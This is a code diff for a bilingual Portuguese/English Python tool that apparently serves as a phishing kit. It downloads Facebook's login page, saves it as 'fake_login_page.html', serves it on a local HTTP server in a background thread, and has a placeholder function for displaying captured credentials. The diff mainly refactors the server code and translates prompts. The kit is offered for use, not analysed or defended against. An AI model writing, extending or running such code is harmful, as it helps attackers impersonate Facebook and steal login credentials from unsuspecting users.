@@ -13,9 +13,6 @@ from colorama import init, Fore, Style
 # Porta para o servidor HTTP local
 PORT = 8000
 
-# Diretório onde os arquivos HTML e CSS serão armazenados
-HTML_CSS_DIR = 'html_css'
-
 # URL da página alvo para clonagem
 TARGET_URL = "https://facebook.com/login.php"
 
@@ -260,7 +257,7 @@ def fake_login_pages(language):
             if response.status_code == 200:
                 html_content = response.text
                 # Salvar HTML localmente
-                with open(os.path.join(HTML_CSS_DIR, 'fake_login_page.html'), 'w', encoding='utf-8') as f:
+                with open('fake_login_page.html', 'w', encoding='utf-8') as f:
                     f.write(html_content)
                 print("Página clonada com sucesso!")
                 page_cloned = True
@@ -275,7 +272,7 @@ def fake_login_pages(language):
                 print("Redirecting to official Facebook page...")
                 time.sleep(3)  # Simulando redirecionamento
                 webbrowser.open("https://facebook.com")
-                input("\nPressione Enter para continuar...")
+                input("\nPress Enter to continue...")
             else:
                 print(Fore.RED + "Erro ao clonar página: HTTP status code", response.status_code)
         else:
@@ -284,42 +281,12 @@ def fake_login_pages(language):
                 print("Fake login page already cloned.")
             else:
                 print("Página de login falso já clonada.")
-            input("\nPressione Enter para continuar...")
+            input("\nPress Enter to continue...")
 
     except Exception as e:
         print(Fore.RED + f"Erro ao clonar página: {e}")
 
-    input("\nPressione Enter para continuar...")
-
-# Função para iniciar o servidor HTTP local
-def start_http_server(language):
-    try:
-        # Configurar e iniciar servidor HTTP local para servir arquivos HTML e CSS
-        os.chdir(HTML_CSS_DIR)
-        Handler = http.server.SimpleHTTPRequestHandler
-
-        with socketserver.TCPServer(("", PORT), Handler) as httpd:
-            if language == '1':
-                print(Fore.GREEN + f"Servidor HTTP local iniciado em http://localhost:{PORT}")
-                print("Pressione Ctrl+C para encerrar o servidor.")
-            else:
-                print(Fore.GREEN + f"Local HTTP server started at http://localhost:{PORT}")
-                print("Press Ctrl+C to terminate the server.")
-            try:
-                httpd.serve_forever()
-            except KeyboardInterrupt:
-                pass
-    except Exception as e:
-        print(Fore.RED + f"Erro ao iniciar servidor HTTP local: {e}")
-
-# Função para exibir as credenciais digitadas em um novo terminal
-def open_new_terminal(language):
-    try:
-        # Simular mensagem de credenciais digitadas
-        print("Credentials entered here...")
-        time.sleep(3)
-    except Exception as e:
-        print(Fore.RED + f"Erro ao abrir novo terminal: {e}")
+    input("\nPress Enter to continue...")
 
 # Função para informações de número de telefone
 def phone_number_info(language):
@@ -355,6 +322,36 @@ def phone_number_info(language):
         print(Fore.RED + f"Error fetching phone number information: {e}")
 
     input("\nPress Enter to continue...")
+
+# Função para iniciar o servidor HTTP local
+def start_http_server(language):
+    try:
+        # Configurar e iniciar servidor HTTP local para servir arquivos HTML e CSS
+        Handler = http.server.SimpleHTTPRequestHandler
+        httpd = socketserver.TCPServer(("", PORT), Handler)
+
+        if language == '1':
+            print(Fore.GREEN + f"Local HTTP server started at http://localhost:{PORT}")
+            print("Press Ctrl+C to terminate the server.")
+        else:
+            print(Fore.GREEN + f"Servidor HTTP local iniciado em http://localhost:{PORT}")
+            print("Pressione Ctrl+C para encerrar o servidor.")
+
+        thread = threading.Thread(target=httpd.serve_forever)
+        thread.daemon = True
+        thread.start()
+
+    except Exception as e:
+        print(Fore.RED + f"Erro ao iniciar servidor HTTP local: {e}")
+
+# Função para exibir as credenciais digitadas em um novo terminal
+def open_new_terminal(language):
+    try:
+        # Simular mensagem de credenciais digitadas
+        print("Credentials entered here...")
+        time.sleep(3)
+    except Exception as e:
+        print(Fore.RED + f"Erro ao abrir novo terminal: {e}")
 
 # Função principal para iniciar o programa
 def start_program():
